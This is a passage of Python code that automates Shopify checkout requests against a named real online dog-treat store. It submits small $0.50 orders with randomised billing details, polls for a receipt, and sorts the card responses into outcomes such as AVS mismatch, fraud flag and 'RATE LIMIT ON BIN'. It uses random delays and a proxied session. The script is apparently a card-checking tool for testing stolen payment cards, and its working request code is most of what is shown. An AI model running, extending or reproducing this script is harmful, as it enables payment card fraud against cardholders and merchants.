IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}payment{...on PendingTerms{pollDelay __typename}...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{name paymentMethodIdentifier __typename}__typename}__typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment RemoteBuyerProposalFragment on RemoteProposal{merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}',
    'variables': {
        'input': {
            'sessionInput': {
                'sessionToken': x,
            },
            'queueToken': queue_token,
            'discounts': {
                'lines': [],
                'acceptUnexpectedDiscounts': True,
            },
            'delivery': {
                'deliveryLines': [
                    {
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {
                                    'any': True,
                                },
                                'shipments': {
                                    'any': True,
                                },
                            },
                            'options': {},
                        },
                        'targetMerchandiseLines': {
                            'lines': [
                                {
                                    'stableId': stableid,
                                },
                            ],
                        },
                        'deliveryMethodTypes': [
                            'NONE',
                        ],
                        'expectedTotalPrice': {
                            'any': True,
                        },
                        'destinationChanged': True,
                    },
                ],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': True,
            },
            'deliveryExpectations': {
                'deliveryExpectationLines': [],
            },
            'merchandise': {
                'merchandiseLines': [
                    {
                        'stableId': stableid,
                        'merchandise': {
                            'productVariantReference': {
                                'id': 'gid://shopify/ProductVariantMerchandise/42238394204242',
                                'variantId': 'gid://shopify/ProductVariant/42238394204242',
                                'properties': [],
                                'sellingPlanId': None,
                                'sellingPlanDigest': None,
                            },
                        },
                        'quantity': {
                            'items': {
                                'value': 5,
                            },
                        },
                        'expectedTotalPrice': {
                            'value': {
                                'amount': '0.50',
                                'currencyCode': 'USD',
                            },
                        },
                        'lineComponentsSource': None,
                        'lineComponents': [],
                    },
                ],
            },
            'memberships': {
                'memberships': [],
            },
            'payment': {
                'totalAmount': {
                    'any': True,
                },
                'paymentLines': [
                    {
                        'paymentMethod': {
                            'directPaymentMethod': {
                                'paymentMethodIdentifier': paymentmethodidentifier,
                                'sessionId': sid,
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': addr1,
                                        'address2': '',
                                        'city': city,
                                        'countryCode': country_code,
                                        'postalCode': postal,
                                        'lastName': rlast,
                                        'zoneCode': zone,
                                        'phone': '',
                                    },
                                },
                                'cardSource': None,
                            },
                            'giftCardPaymentMethod': None,
                            'redeemablePaymentMethod': None,
                            'walletPaymentMethod': None,
                            'walletsPlatformPaymentMethod': None,
                            'localPaymentMethod': None,
                            'paymentOnDeliveryMethod': None,
                            'paymentOnDeliveryMethod2': None,
                            'manualPaymentMethod': None,
                            'customPaymentMethod': None,
                            'offsitePaymentMethod': None,
                            'customOnsitePaymentMethod': None,
                            'deferredPaymentMethod': None,
                            'customerCreditCardPaymentMethod': None,
                            'paypalBillingAgreementPaymentMethod': None,
                            'remotePaymentInstrument': None,
                        },
                        'amount': {
                            'value': {
                                'amount': '0.5',
                                'currencyCode': 'USD',
                            },
                        },
                    },
                ],
                'billingAddress': {
                    'streetAddress': {
                        'address1': addr1,
                        'address2': '',
                        'city': city,
                        'countryCode': country_code,
                        'postalCode': postal,
                        'lastName': rlast,
                        'zoneCode': zone,
                        'phone': '',
                    },
                },
            },
            'buyerIdentity': {
                'customer': {
                    'presentmentCurrency': 'USD',
                    'countryCode': 'US',
                },
                'email': remail,
                'emailChanged': False,
                'phoneCountryCode': 'US',
                'marketingConsent': [],
                'shopPayOptInPhone': {
                    'countryCode': 'US',
                },
                'rememberMe': False,
            },
            'tip': {
                'tipLines': [],
            },
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': None,
                'proposedTotalIncludedAmount': {
                    'value': {
                        'amount': '0',
                        'currencyCode': 'USD',
                    },
                },
                'proposedMixedStateTotalAmount': None,
                'proposedExemptions': [],
            },
            'note': {
                'message': None,
                'customAttributes': [],
            },
            'localizationExtension': {
                'fields': [],
            },
            'nonNegotiableTerms': None,
            'scriptFingerprint': {
                'signature': None,
                'signatureUuid': None,
                'lineItemScriptChanges': [],
                'paymentScriptChanges': [],
                'shippingScriptChanges': [],
            },
            'optionalDuties': {
                'buyerRefusesDuties': False,
            },
            'cartMetafields': [],
        },
        'attemptToken': f'{tok}',
        'metafields': [],
        'analytics': {
            'requestUrl': f'https://wagsterdogtreats.com/checkouts/cn/{tok}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
        },
    },
    'operationName': 'SubmitForCompletion',
    }

    # MODIFICATION: Removed explicit proxy=, session handles it
    response = session.post('https://wagsterdogtreats.com/checkouts/unstable/graphql',
        params=params,
        headers=headers,
        json=json_data
    )
    raw = response.text
    print(f"Submit Response: {raw[:500]}...")  # Debug log
    try:
        res_json = json.loads(raw)
        submit_data = res_json['data']['submitForCompletion']
        if 'receipt' in submit_data or submit_data.get('__typename') in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
            rid = submit_data['receipt']['id'] if 'receipt' in submit_data else submit_data.get('receipt', {}).get('id')
            print(f"Receipt ID: {rid}")
        elif 'buyerProposal' in submit_data or submit_data.get('__typename') == 'SubmitRejected':
            print("Submit returned buyerProposal - rejected.")
            errors = submit_data.get('errors', [])
            if errors:
                for e in errors:
                    code = e.get('code', 'Unknown')
                    msg = e.get('localizedMessage', 'No message')
                    print(f"Error Code: {code}, Message: {msg}")
                    if 'avs' in code.lower() or 'address' in msg.lower():
                        return "Declined: AVS/Address Mismatch"
                    elif 'fraud' in code.lower() or 'risk' in code.lower():
                        return "Declined: Fraud/Risk Detected"
                    elif 'captcha_metadata_missing' in msg.lower() or 'captcha' in msg.lower():
                        return "RATE LIMIT ON BIN"
                    elif 'price' in msg.lower() or 'total' in msg.lower():
                        return "Declined: Price Mismatch"
                    else:
                        return f"Declined: {code} - {msg}"
            else:
                return "Declined: Rejected (negotiation required or fraud detected)"
        else:
            # Check for other cases like Throttled
            if 'Throttled' in str(submit_data):
                return "Throttled: Rate limited"
            errors = res_json.get('errors', [])
            if errors:
                return f"GraphQL Error: {errors[0].get('message', 'Unknown')}"
            return "Failed at step 5: Unexpected response structure."
            
    except (json.JSONDecodeError, KeyError, TypeError) as e:
        print(f"Parse error: {e}")
        print(f"Raw response: {raw[:300]}")
        return f"Failed at step 5: Could not parse response. Error: {e}"

    random_delay(0.2, 0.5)

    # Step 6: Poll for receipt
    print("Step 6: Polling for receipt...")
    headers = {
        'authority': 'wagsterdogtreats.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/json',
        'origin': 'https://wagsterdogtreats.com',
        'referer': 'https://wagsterdogtreats.com/',
        'sec-fetch-site': 'same-origin',
        'shopify-checkout-client': 'checkout-web/1.0',
        'user-agent': user_agent,
        'x-checkout-one-session-token': x,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
    }
    params = {
        'operationName': 'PollForReceipt',
    }
    json_data = {
        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}paymentIcon __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}completedRemoteCheckouts{...CompletedRemoteCheckouts __typename}consolidatedTotals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}consolidatedTaxes{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxesIncludedAmountInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}consolidatedProposedSubtotalBeforeTaxesAndShipping{amount currencyCode __typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id pollDelay remoteCheckouts{...on SubmittingRemoteCheckout{shopId __typename}...on SubmittedRemoteCheckout{shopId __typename}...on FailedRemoteCheckout{shopId __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}...on BankPaymentInstrument{bankName lastDigits paymentMethodIdentifier __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment CompletedRemoteCheckouts on CompletedRemoteCheckout{...on SubmittedRemoteCheckout{shopId checkoutSessionToken processedRemoteReceipt:remoteReceipt{id orderIdentity{buyerIdentifier id __typename}orderStatusPageUrl 